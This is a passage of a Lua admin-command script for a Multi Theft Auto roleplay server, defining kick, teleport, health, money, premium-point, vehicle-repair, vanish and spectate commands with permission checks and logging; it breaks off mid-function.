--ALTER TABLE `characters` ADD `pm` INT(11) NOT NULL DEFAULT '0' AFTER `kick`, ADD `valasz` INT(11) NOT NULL DEFAULT '0' AFTER `pm`;

local serverWeb = exports["fv_engine"]:getServerData("web")
white = "#ffffff"
local hexColor = exports['fv_engine']:getServerColor("servercolor", true)
local sColor = exports['fv_engine']:getServerColor("servercolor", true)
local hexColorb = exports['fv_engine']:getServerColor("blue", true)
local hexColorr = exports['fv_engine']:getServerColor("red", true)
local connection = exports.fv_engine:getConnection(getThisResource());

local devSerials = {};
devSerials["D5ED219F39904C559DC2EC786DCB5584"] = true; -- ide írd a serialod hogy tudd használni a devCommandsokat


local devCommands = {
	["restart"] = true,
	["start"] = true,
	["refresh"] = true,
	["debugscript"] = true,
	["stop"] = true,
	["crun"] = true,
	["srun"] = true,
	["aexec"] = true,
	["run"] = true,
};

local acmds = {}

function addAdminCommand(command, level, description, forceResourceName)
	if not acmds[command] then
		local resourceName = forceResourceName or "fv_admin"

		if not forceResourceName and sourceResource then
			resourceName = getResourceName(sourceResource)
		end

		acmds[command] = {level, description, resourceName}
	end
end

addEvent("requestAdminCommands", true)
addEventHandler("requestAdminCommands", getRootElement(),
	function()
		if isElement(source) then
			triggerClientEvent(source, "receiveAdminCommands", source, acmds)
		end
	end)

addEventHandler("onResourceStop", getRootElement(),
	function(stoppedResource)
		if stoppedResource == getThisResource() then
			local array = {}
			local count = 0

			for k, v in pairs(acmds) do
				if v[3] ~= "fv_admin" then
					array[k] = v
					count = count + 1
				end
			end

			if count > 0 then
				setElementData(getResourceRootElement(getResourceFromName("fv_modstarter")), "adminCommandsCache", array, false)
			end
		else
			local resname = getResourceName(stoppedResource)

			for k, v in pairs(acmds) do
				if v[3] == resname then
					acmds[k] = nil
				end
			end
		end
	end)

addEventHandler("onResourceStart", getResourceRootElement(),
	function(startedResource)
		connection = exports.fv_engine:getConnection(getThisResource());

		local theRes = getResourceRootElement(getResourceFromName("fv_modstarter"))

		if theRes then
			local cache = getElementData(theRes, "adminCommandsCache")

			if cache then
				for k, v in pairs(cache) do
					if not acmds[k] then
						addAdminCommand(k, v[1], v[2], v[3])
					end
				end

				removeElementData(theRes, "adminCommandsCache")
			end
		end
	end)

addCommandHandler("reloadacl", function (player)
	local serial = getPlayerSerial(player)
	if devSerials[serial] then
		if aclReload() then 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."ACL reloaded!",player,255,255,255,true);
		else 
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."ACL reload failed!",player,255,255,255,true);
		end
	end
end)

addEventHandler ("onPlayerCommand", getRootElement(), function (cmd )
	local serial = getPlayerSerial ( source )
	if not (devSerials[serial] ) then
		if (devCommands[cmd]) then
			outputChatBox (exports.fv_engine:getServerSyntax("Admin","red").."You cannot use this command!",source,255,255,255,true);
			cancelEvent();
		end
	end
	if devSerials[serial] then
		if (devCommands[cmd]) then
			sendMessageToAdmin(source, hexColor..getAdminName(source)..white.." used "..hexColor..cmd..white.." command!", 5);
			exports['fv_logs']:createLog(cmd, getAdminName(source).." used " ..cmd.." command!",source);
		end
	end
end);

addEventHandler("onClientResourceStart", root, function(resource)
	if getResourceName(resource) == "fv_engine" then
		serverWeb = exports["fv_engine"]:getServerData("web")
		hexColor = exports['fv_engine']:getServerColor("servercolor", true)
		hexColorb = exports['fv_engine']:getServerColor("blue", true)
		hexColorr = exports['fv_engine']:getServerColor("red", true)
		connection = exports['fv_engine']:getConnection(getThisResource())
		sColor = exports['fv_engine']:getServerColor("servercolor", true)
	end
end);
	
function loadAdminStats(player)
	setElementData(player,"admin.duty",0);
	setElementData(player,"admin.rtc",0);
	setElementData(player,"admin.fix",0);
	setElementData(player,"admin.fuel",0);
	setElementData(player,"admin.ban",0);
	setElementData(player,"admin.jail",0);
	setElementData(player,"admin.kick",0);
	setElementData(player,"admin.pm",0);
	setElementData(player,"admin.valasz",0);
	setElementData(player,"admin >> time",0);

	dbQuery(function(qh)
		local res = dbPoll(qh,0);
		for k,v in pairs(res) do 
			setElementData(player,"admin.duty",v.adutytime);
			setElementData(player,"admin.rtc",v.rtc);
			setElementData(player,"admin.fix",v.fix);
			setElementData(player,"admin.fuel",v.fuel);
			setElementData(player,"admin.ban",v.ban);
			setElementData(player,"admin.jail",v.jail);
			setElementData(player,"admin.kick",v.kick);
			setElementData(player,"admin.pm",v.pm);
			setElementData(player,"admin.valasz",v.valasz);
			setElementData(player,"admin >> time",v.adutytime);
		end 
	end,connection,"SELECT * FROM characters WHERE id=?",getElementData(player,"acc >> id"));
end
addEventHandler("onResourceStart",resourceRoot,function()
	for k,v in pairs(getElementsByType("player")) do 
		if getElementData(v,"admin >> level") and getElementData(v,"admin >> level") > 0 then 
			loadAdminStats(v);
		end
	end
end);
addEventHandler("onElementDataChange",root,function(dataName,oldValue,newValue)
if getElementType(source) == "player" then 
	if dataName == "acc >> id" or dataName == "admin >> level" then 
		if (getElementData(source,"admin >> level") or -1) > 0 then 
			loadAdminStats(source);
			--outputDebugString(getPlayerName(source).." admin stats loaded!");
		end
	end
	if dataName == "admin >> duty" then 
		if not newValue then 
			local time = getElementData(source,"admin >> time") or 0;
			dbExec(connection,"UPDATE characters SET adutytime=? WHERE id=?",time,getElementData(source,"acc >> id"));
		end
	end
end
end);

addEventHandler("onPlayerQuit",root,function()
	local time = getElementData(source,"admin >> time") or 0;
	dbExec(connection,"UPDATE characters SET adutytime=? WHERE id=?",time,getElementData(source,"acc >> id"));
end);

function kickPlayerByAdmin( player, cmd, target, ...)
	if hasPermission ( player, cmd ) then
		if target and (...) then      
			local targetPlayer = exports['fv_engine']:findPlayer(source, target);
			local reason = table.concat({...}, "_")
			if (targetPlayer) then
				if getElementData(targetPlayer,"admin >> level") > getElementData(player,"admin >> level") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Kicked you from the server. "..hexColor..getAdminName(player) ,targetPlayer,255,255,255,true) outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Nem  rúghatod ki őt: "..hexColor..getAdminName(targetPlayer) ,player,255,255,255,true) return end
				outputConsole("[KICK] "..getAdminName(player,true).." kicked "..getPlayerName(targetPlayer):gsub("_"," ").." Player. Reason :"..reason:gsub("_"," "))
			 
				local color = exports.fv_engine:getServerColor("red",true);
				outputChatBox(color.."[KICK]: "..sColor..getAdminName(player,true)..white.." kicked "..sColor..getElementData(targetPlayer,"char >> name")..white.." player.",root,255,255,255,true);
				outputChatBox(color.."[KICK]: "..white.."reason: "..sColor..reason:gsub("_"," ")..white..".",root,255,255,255,true);

				exports.fv_infobox:addNotification(root,"kick",getAdminName(player,true).." kicked "..getElementData(targetPlayer,"char >> name").." player.","reason: "..reason:gsub("_"," ")..".");

				kickPlayer(targetPlayer,getAdminName(player),reason:gsub("_"," "));

				setElementData(player,"admin.kick",getElementData(player,"admin.kick") + 1);
				dbExec(connection,"UPDATE characters SET kick=? WHERE id=?",getElementData(player,"admin.kick"),getElementData(player,"acc >> id"));
			end
		else
			outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/".. cmd .. " [Partial name/ID] [reason]", player, 255,255,255,true  );
		end
	else
		noAdmin(player, cmd);
	end
end
addCommandHandler("akick",kickPlayerByAdmin,false,false);
addCommandHandler("kick",kickPlayerByAdmin,false,false);
addAdminCommand("kick", 3, "Kick a player")

function as(source, cmd, ...)
	if not hasPermission(source, "as") then noAdmin(source, cmd) return end
	if not ... then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [message]",source, 255,255,255,true) return end
	local msg = table.concat({...}, " ")
	if ... then
		sendMessageToAdminc(source, getAdminColor(source,getElementData(source,"admin >> level"))..""..getAdminName(source,true).."#FFFFFF ("..getElementData(source,"char >> id").."): "..msg, 1)
	end
end
addCommandHandler("as", as,false,false);
addAdminCommand("as", 1, "AS Chat")

function a(source, cmd, ...)
	if not hasPermission(source, "a") then noAdmin(source, cmd) return end
	if not ... then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [message]",source, 255,255,255,true) return end
	local msg = table.concat({...}, " ")
	if ... then
		sendMessageToAdmina(source, getAdminColor(source,getElementData(source,"admin >> level"))..""..(getElementData(source, "admin >> name") or "Ismeretlen Admin").."#FFFFFF ("..getElementData(source,"char >> id").."): "..msg, 3)
		end
end
addCommandHandler("a", a,false,false);
addAdminCommand("a", 3, "Admin chat")

---------------------- REPORT ------------------------------------
function report(source, cmd,target, ...)
	if not ... or not target then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [ID] [message]",source, 255,255,255,true) return end
	local msg = table.concat({...}, " ")
	local targetid = target
	local target = exports['fv_engine']:findPlayer(source, target)
	--local source = exports['fv_engine']:findPlayer(source, target)
	if ... and target then
		outputChatBox(exports.fv_engine:getServerSyntax("Report","red").."You have reported #CA2323"..getAdminName(target).." #FFFFFF(" ..targetid.. "), Reason: #CA2323" ..msg,source, 255,255,255,true)
		SendReportToAdmin(source, getAdminName(source).. " have reported #CA2323 "..getAdminName(target).. " #FFFFFF(" ..targetid.. ")." , 3)
		SendReportToAdmin(source, "Reason: #CA2323" ..msg,3)
	end	
end
addCommandHandler("report", report);

----------------------------------------------------------

--[[addCommandHandler("agyogyit", function(source, cmd, target)
	if not hasPermission(source, "goto") then noAdmin(source, cmd) return end
	if not target then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [player]",source, 255,255,255,true) return end
	local target = exports['fv_engine']:findPlayer(source, target)
	if target then
		if not getElementData(target,"loggedIn") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player is not logged in!",source,255,255,255,true) return end

		setElementData(target, "char >> bone", {true, true, true, true, true})
		toggleMoveControls(target,true)
		sendMessageToAdmin(source, hexColor..getAdminName(source)..white.." meggyógyította "..hexColor..getAdminName(target)..white.." játékost!", 3)
		outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."successfully meggyógyítottad "..hexColor..getAdminName(target)..white.." játékost!",source,255,255,255,true)
		outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..hexColor..getAdminName(source,true)..white.." meggyógyított!",target,255,255,255,true)
	end	
end)--]]

function toggleMoveControls(element,value)
    toggleControl(element,"sprint", value)
    toggleControl(element,"jump", value)
    toggleControl(element,"fire", value)
    toggleControl(element,"aim_weapon", value)
    toggleControl(element,"enter_exit", value)
end

function goto(source, cmd, target)
	if not hasPermission(source, "goto") then noAdmin(source, cmd) return end
	if not target then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [player]",source, 255,255,255,true) return end
	local target = exports['fv_engine']:findPlayer(source, target)
		if target then
			if not getElementData(target,"loggedIn") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player is not logged in!",source,255,255,255,true) return end
			if target == source then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You can't teleport to yourself!",source,255,255,255,true) return end

			if getElementData(target, "char >> adminJail") then 
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."!",source,255,255,255,true)
				return
			end

			local x,y,z = getElementPosition(target)
			local dim = getElementDimension(target)
			local int = getElementInterior(target)
			local veh = getPedOccupiedVehicle(source);
			if veh then
				setElementPosition(veh,x+2,y,z);
				setElementDimension(veh,dim);
				setElementInterior(veh,int);
			else 
				setElementPosition(source,x+2,y,z);
				setElementDimension(source,dim);
				setElementInterior(source,int);
			end
		
			sendMessageToAdmin(source, hexColor..getAdminName(source)..white.." successfully teleported to "..hexColor..getAdminName(target)..white.."!", 3)
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."successfully teleported to "..hexColor..getAdminName(target)..white.."!",source,255,255,255,true)
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..hexColor..getAdminName(source,true)..white.." teleported to you!",target,255,255,255,true)
	 		end
end
addCommandHandler("goto", goto,false,false);
addAdminCommand("goto", 3, "Teleport to a player")

function gethere(source, cmd, target)
	if not hasPermission(source, "gethere") then noAdmin(source, cmd) return end
	if not target then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [player]",source, 255,255,255,true) return end
		 local target = exports['fv_engine']:findPlayer(source, target)
		 if target then
			if not getElementData(target,"loggedIn") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player is not logged in!",source,255,255,255,true) return end
			if target == source then return end

			if getElementData(target, "char >> adminJail") then 
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."The player is in jail!",source,255,255,255,true)
				return
			end


			local x,y,z = getElementPosition(source)
	 			local dim = getElementDimension(source)
			local int = getElementInterior(source)
			
			local veh = getPedOccupiedVehicle(target);
			if veh then 
				setElementPosition(veh,x+2,y,z)
				setElementDimension(veh,dim)
				setElementInterior(veh,int)
			else 
				setElementPosition(target,x+2,y,z)
				setElementDimension(target,dim)
				setElementInterior(target,int)
			end
		sendMessageToAdmin(source, hexColor..getAdminName(source)..white.." successfully teleported "..hexColor..getAdminName(target)..white.." to him!", 3)
	 		outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."You have successfully teleported "..hexColor..getAdminName(target)..white.." to you!",source,255,255,255,true)
		outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..hexColor..getAdminName(source,true)..white.." teleported you to himself!",target,255,255,255,true)
	 end
end
addCommandHandler("gethere", gethere,false,false);
addAdminCommand("gethere", 3, "Player getaway", "fv_admin")

function sethp(source, cmd, target, hp)
	if not hasPermission(source, "sethp") then noAdmin(source, cmd) return end
	if not target or not hp then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [player] [value]",source, 255,255,255,true) return end
	if tonumber(hp) == nil then return end
	local target = exports['fv_engine']:findPlayer(source, target) 
	local hp = tonumber(hp)
	if not getElementData(target,"loggedIn") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player is not logged in!",source,255,255,255,true) return end
	if hp > 100 then return end
	if getElementData(target,"admin >> level") > getElementData(source,"admin >> level") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").." You can't set more admin vitality!",source, 255,255,255,true) return end
	setElementHealth(target, hp)
	sendMessageToAdmin(source, hexColor..getAdminName(source,true)..white.." Produced by " ..hexColor..getAdminName(target)..white.." vitality ("..hexColor..hp.."%"..white..")" , 3)
	exports.fv_logs:createLog("SETHP",getAdminName(source,true).." Produced by " ..getAdminName(target).." vitality ("..hp.."%"..")",source,target);
end
addCommandHandler("sethp",sethp,false,false);
addAdminCommand("sethp", 3, "Adjusts the player's vitality", "fv_admin")

function sethunger(source, cmd, target, hunger)
	if not hasPermission(source, "sethunger") then noAdmin(source, cmd) return end
	if not target or not hunger then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [player] [value]",source, 255,255,255,true) return end
	if  tonumber(hunger) == nil then return end
	local target = exports['fv_engine']:findPlayer(source, target) 
	local hunger = tonumber(hunger)
	if not getElementData(target,"loggedIn") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player is not logged in!",source,255,255,255,true) return end
	if hunger > 100 then return end
	if getElementData(target,"admin >> level") > getElementData(source,"admin >> level") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").." You can't set a higher admin hunger level!",source, 255,255,255,true) return end
	setElementData(target, "char >> food", hunger)
	sendMessageToAdmin(source, hexColor..getAdminName(source,true)..white.." Produced by " ..hexColor..getAdminName(target)..white.." hunger levels. ("..hexColor..hunger.."%"..white..")" , 3)
	exports.fv_logs:createLog("SETHUNGER",getAdminName(source,true).." Produced by " ..getAdminName(target).." hunger. New value: "..hunger..".",source,target);
end
addCommandHandler("sethunger",sethunger,false,false);
addAdminCommand("sethunger", 3, "Adjusts the player's hunger level", "fv_admin")

function setdrink(source, cmd, target, drink)
	if not hasPermission(source, "setdrink") then noAdmin(source, cmd) return end
	if not target or not drink then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [player] [value]",source, 255,255,255,true) return end
	if tonumber(drink) == nil then return end
	local target = exports['fv_engine']:findPlayer(source, target) 
	local drink = tonumber(drink)
	if not getElementData(target,"loggedIn") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player is not logged in!",source,255,255,255,true) return end
	if drink > 100 then return end
	if getElementData(target,"admin >> level") > getElementData(source,"admin >> level") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").." You can't claim a bigger admin thirst!",source, 255,255,255,true) return end
	setElementData(target, "char >> drink", drink)
	sendMessageToAdmin(source, hexColor..getAdminName(source,true)..white.." Produced by " ..hexColor..getAdminName(target)..white.." thirst ("..hexColor..drink.."%"..white..")" , 3)
	exports.fv_logs:createLog("SETDRINK",getAdminName(source,true).." Produced by " ..getAdminName(target).." thirst.  New value: "..drink..".",source,target);
end
addCommandHandler("setdrink",setdrink,false,false);
addAdminCommand("setdrink", 3, "Adjusts the player's thirst level", "fv_admin")

function setarmor(source, cmd, target, armor)
	if not hasPermission(source, "setarmor") then noAdmin(source, cmd) return end
	if not target or not armor then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [player] [value]",source, 255,255,255,true) return end
	if tonumber(armor) == nil then return end
	local target = exports['fv_engine']:findPlayer(source, target) 
	local armor = tonumber(armor)
	if not getElementData(target,"loggedIn") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player is not logged in!",source,255,255,255,true) return end
	if armor > 100 then return end
	if getElementData(target,"admin >> level") > getElementData(source,"admin >> level") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").." You can't set a bigger admin armor!",source, 255,255,255,true) return end
	setPedArmor(target,armor)
	sendMessageToAdmin(source, hexColor..getAdminName(source,true)..white.." Produced by " ..hexColor..getAdminName(target)..white.." armor of ("..hexColor..armor.."%"..white..")" , 3)
	exports.fv_logs:createLog("SETARMOR",getAdminName(source,true).." Produced by " ..getAdminName(target).." armor. New value: "..armor..".",source,target);
end
addCommandHandler("setarmor",setarmor,false,false);
addAdminCommand("setarmor", 3, "Adjusts the player's armor", "fv_admin")

function setmoney(source, cmd, target, num,t)
	if not hasPermission(source, "setmoney") then noAdmin(source, cmd) return end
	if getElementData(source,"admin >> level") == 10 then return end;
	if not target or not num or not t then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [player] [value] [0-setting, 1-add, 2-subtract]",source, 255,255,255,true) return end
	if tonumber(num) == nil then return end
	if not math.floor(tonumber(num)) then return end
	if not tonumber(t) then return end;
	if not math.floor(tonumber(t)) then return end;
	local target = exports['fv_engine']:findPlayer(source, target) 
	local num = tonumber(num)	
	local t = math.floor(tonumber(t));
	if not getElementData(target,"loggedIn") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player is not logged in!",source,255,255,255,true) return end
	if target then
		if t == 0 then 
			setElementData(target,"char >> money", num)
			sendMessageToAdmin(source, hexColor..getAdminName(source,true)..white.." Produced by " ..hexColor..getAdminName(target)..white.." your money New value: "..hexColor..num.." dt"..white.."." , 3)
			exports.fv_logs:createLog("SETMONEY",getAdminName(source,true).." Produced by " ..getAdminName(target).." your money New value: "..num.." dt",source,target);
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..hexColor..getAdminName(source,true)..white.." set your money ("..hexColor..num.."dt"..white..")",target, 255,255,255,true)
		elseif t == 1 then --Hozzáadás 
			setElementData(target,"char >> money",getElementData(target,"char >> money") + num);
			sendMessageToAdmin(source, hexColor..getAdminName(source,true)..white.." gave " ..hexColor..num..white.." dt to: "..hexColor.. getAdminName(target)..white.."." , 3);
			exports.fv_logs:createLog("SETMONEY",getAdminName(source,true).." gave " ..num.." dt to: ".. getAdminName(target)..".",source,target);
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..hexColor..getAdminName(source,true)..white.." gave "..hexColor..num..white.." dt",target, 255,255,255,true)
		elseif t == 2 then 
			setElementData(target,"char >> money",getElementData(target,"char >> money") - num);
			sendMessageToAdmin(source, hexColor..getAdminName(source,true)..white.." removed " ..hexColor..num..white.." dt from: "..hexColor.. getAdminName(target)..white.."." , 3);
			exports.fv_logs:createLog("SETMONEY",getAdminName(source,true).." removed " ..num.." dt from: ".. getAdminName(target)..".",source,target);
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..hexColor..getAdminName(source,true)..white.." took "..hexColor..num..white.." dt from you",target, 255,255,255,true)
		end
	end
end
addCommandHandler("givemoney",setmoney,false,false);
addCommandHandler("setplayermoney",setmoney,false,false);

-- function setpp(source, cmd, target, num)
-- 	if not hasPermission(source, "setpp") then noAdmin(source, cmd) return end
-- 	if not target or not num then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [player] [value]",source, 255,255,255,true) return end
-- 	if  tonumber(num) == nil then return end
-- 	local target = exports['fv_engine']:findPlayer(source, target) 
-- 	local num = tonumber(num)	
-- 	if not getElementData(target,"loggedIn") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player is not logged in!",source,255,255,255,true) return end
-- 	if target then
-- 		dbExec(connection,"UPDATE characters SET premiumPoints=? WHERE id=?",num,getElementData(target,"acc >> id"));

-- 		setElementData(target,"char >> premiumPoints", num)
-- 		sendMessageToAdmin(source, hexColor..getAdminName(source,true)..white.." Produced by " ..hexColor..getAdminName(target)..white.." pp-ét ("..hexColor..num.." PP"..white..")" , 3)
-- 		exports['fv_logs']:createLog("fv_admin", getAdminName(source,true).." Produced by " ..getAdminName(target).." pp-ét ("..num.." PP )",source,target)
-- 		outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..hexColor..getAdminName(source,true)..white.." beállitota a PP-d ("..hexColor..num.."PP"..white..")",source, 255,255,255,true)
-- 	end
-- end
-- addCommandHandler("setpp",setpp,false,false);

function setpp(source, cmd, target, num,t)
	if not hasPermission(source, "setpp") then noAdmin(source, cmd) return end
	--if getElementData(source,"admin >> level") >= 10 then return end;
	if not target or not num or not t then outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/"..cmd.." [player] [value] [0-setting, 1-add, 2-subtract]",source, 255,255,255,true) return end
	if tonumber(num) == nil then return end
	if not math.floor(tonumber(num)) then return end
	if not tonumber(t) then return end;
	if not math.floor(tonumber(t)) then return end;
	local target = exports['fv_engine']:findPlayer(source, target) 
	local num = tonumber(num)	
	local t = math.floor(tonumber(t));
	if not getElementData(target,"loggedIn") then outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."Player is not logged in!",source,255,255,255,true) return end
	if target then
		if t == 0 then 
			dbExec(connection,"UPDATE characters SET premiumPoints=? WHERE id=?",num,getElementData(target,"acc >> id"));
			setElementData(target,"char >> premiumPoints", num)
			sendMessageToAdmin(source, hexColor..getAdminName(source,true)..white.." Produced by " ..hexColor..getAdminName(target)..white.." PP New value: "..hexColor..num.." PP"..white.."." , 3)
			exports.fv_logs:createLog("SETPP",getAdminName(source,true).." Produced by " ..getAdminName(target).." PP New value: "..num.." PP",source,target);
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..hexColor..getAdminName(source,true)..white.." set your PP to ("..hexColor..num.."PP"..white..")",target, 255,255,255,true)
		elseif t == 1 then --Hozzáadás 
			dbExec(connection,"UPDATE characters SET premiumPoints=? WHERE id=?",getElementData(target,"char >> premiumPoints") + num,getElementData(target,"acc >> id"));
			setElementData(target,"char >> premiumPoints",getElementData(target,"char >> premiumPoints") + num);
			sendMessageToAdmin(source, hexColor..getAdminName(source,true)..white.." gave " ..hexColor..num..white.." PP to: "..hexColor.. getAdminName(target)..white.."." , 3);
			exports.fv_logs:createLog("SETPP",getAdminName(source,true).." gave " ..num.." PP to: ".. getAdminName(target)..".",source,target);
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..hexColor..getAdminName(source,true)..white.." gave "..hexColor..num..white.." PP",target, 255,255,255,true)
		elseif t == 2 then 
			dbExec(connection,"UPDATE characters SET premiumPoints=? WHERE id=?",getElementData(target,"char >> premiumPoints") - num,getElementData(target,"acc >> id"));
			setElementData(target,"char >> premiumPoints",getElementData(target,"char >> premiumPoints") - num);
			sendMessageToAdmin(source, hexColor..getAdminName(source,true)..white.." removed " ..hexColor..num..white.." PP from: "..hexColor.. getAdminName(target)..white.."." , 3);
			exports.fv_logs:createLog("SETPP",getAdminName(source,true).." removed " ..num.." PP from: ".. getAdminName(target)..".",source,target);
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..hexColor..getAdminName(source,true)..white.." removed from you "..hexColor..num..white.." PP",target, 255,255,255,true)
		end
	end
end
addCommandHandler("setpp",setpp,false,false);
addAdminCommand("setpp", 11, "Sets the player's premium points", "fv_admin")

function fixveh(player, cmd, target)
	if not hasPermission(player, "fix") then noAdmin(player, cmd) return end
	if not target then
		local veh = getPedOccupiedVehicle(player)
		if not veh then
			outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You're not in a vehicle!",player,255,255,255,true)
		else
			fixVehicle(veh)
			sendMessageToAdmin(player,hexColor..getAdminName(player,true)..white.." assembled his own vehicle!", 5)
			exports.fv_logs:createLog("FIXVEH",getAdminName(player,true).. " fixed his own vehicle.",player);
			setElementData(player,"admin.fix",getElementData(player,"admin.fix") + 1);
			dbExec(connection,"UPDATE characters SET fix=? WHERE id=?",getElementData(player,"admin.fix"),getElementData(player,"acc >> id"));
		end
		else
	 		local target = exports['fv_engine']:findPlayer(player, target)
	 		if target then
	 			local veh = getPedOccupiedVehicle(target)
	 			if not veh then  outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."The player is not sitting in a vehicle!",player,255,255,255,true) return end
				 fixVehicle(veh)
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor")..hexColor..getAdminName(player)..white.." assembled your vehicle!",target,255,255,255,true);
			sendMessageToAdmin(player,hexColor..getAdminName(player,true)..white.." repaired "..hexColor..getAdminName(target)..white.."'s' vehicle!", 5)
			exports.fv_logs:createLog("FIXVEH",getAdminName(player,true).. " fixed "..(getAdminName(target):gsub("_"," ")).."'s vehicle.",player,target);

			setElementData(player,"admin.fix",getElementData(player,"admin.fix") + 1);
			dbExec(connection,"UPDATE characters SET fix=? WHERE id=?",getElementData(player,"admin.fix"),getElementData(player,"acc >> id"));
	 		end
	 end
end
addCommandHandler("fixveh",fixveh,false,false);
addCommandHandler("fix",fixveh,false,false);
addAdminCommand("fixveh", 4, "Repair the vehicle", "fv_admin")

function vanish(player)
	if not hasPermission(player, "vanish") then noAdmin(player) return end
	local visible = getElementData(player,"char >> invisible")
	if visible then
		setElementAlpha(player, 255)
		setElementData(player,"char >> invisible",false)
		outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."You have become visible",player, 255,255,255,true)
	else
		setElementAlpha(player, 0)
		setElementData(player,"char >> invisible",true)
		outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."You have become invisible",player, 255,255,255,true)
	end
end
addCommandHandler("disappear", vanish,false,false);
addCommandHandler("vanish", vanish,false,false);
addAdminCommand("vanish", 3, "hide", "fv_admin")

--/RECON by Worthless
function reconPlayer(player, cmd, targetPlayer)
	if hasPermission(player, cmd) then
		if (targetPlayer) then
			targetPlayer = exports.fv_engine:findPlayer(player, targetPlayer);
			if (targetPlayer ~= player) then -- Recon
				if (getElementData(targetPlayer, "loggedIn")) then
					local targetInt = getElementInterior(targetPlayer);
					local targetDim = getElementDimension(targetPlayer);
					
					if not (getElementData(player, "reconPlayer")) then
						local x, y, z = getElementPosition(player)
						local rot = getPedRotation(player)
						local dimension = getElementDimension(player)
						local interior = getElementInterior(player)
						setElementData(player, "reconx", x)
						setElementData(player, "recony", y, false)
						setElementData(player, "reconz", z, false)
						setElementData(player, "reconrot", rot, false)
						setElementData(player, "recondimension", dimension, false)
						setElementData(player, "reconinterior", interior, false)
						setElementData(player, "reconPlayer",targetPlayer);
						setElementData(player, "reconVanish", getElementData(player, "char >> invisible"));
					end
					
					setElementCollisionsEnabled(player, false);
					setElementAlpha(player, 0);
					setElementData(player, "char >> invisible", true);
					
					setElementInterior(player, targetInt);
					setElementDimension(player, targetDim);
					
					setTimer(function()
						attachElements(player, targetPlayer, 0, 0, 3);
						setCameraTarget(player, targetPlayer);
					end, 100, 1);
					
					triggerClientEvent(player, "admin:toggleReconUpdate", resourceRoot, true);
					
					outputChatBox(exports.fv_engine:getServerSyntax("Admin","servercolor").."You're now watching " ..hexColor..getAdminName(targetPlayer,true) ..white.. ".", player, 255,255,255,true);
					sendMessageToAdmin(player, hexColor..getAdminName(player,true)..white.." is now watching " ..hexColor..getAdminName(targetPlayer)..white.."." , 3);
				else -- Nem bejelentkezett játékosra recon
					outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."The player is not logged in.", player, 255, 255,255,true)
				end
			else -- Ön magára recon
				outputChatBox(exports.fv_engine:getServerSyntax("Admin","red").."You can't spectate yourself!", player, 255, 255,255,true)
			end
		else
			if not getElementData(player, "reconPlayer") then -- Szintaxis kiíratás
				outputChatBox(exports.fv_engine:getServerSyntax("Use","red").."/" .. commandName .. " [Partial name/ID]", player, 255, 255, 255, true);
				return;
			end
		
			setElementCollisionsEnabled(player, true);
			detachElements(player, targetPlayer);
			
			local rx = getElementData(player, "reconx")
			local ry = getElementData(player, "recony")
			local rz = getElementData(player, "reconz")
			local reconrot = getElementData(player, "reconrot")
			local recondimension = getElementData(player, "recondimension")
			local reconinterior = getElementData(player, "reconinterior")
			
			setElementPosition(player, rx, ry, rz);
			setPedRotation(player, reconrot);
			setElementDimension(player, recondimension);
			setElementInterior(player, reconinterior);
			
			setCameraTarget(player, player);
			
			setElementInterior(player, reconinterior);
			setCameraInterior(player, reconinterior);
			setElementDimension(player, recondimension);
			
			if not (getElementData(player, "reconVanish")) then
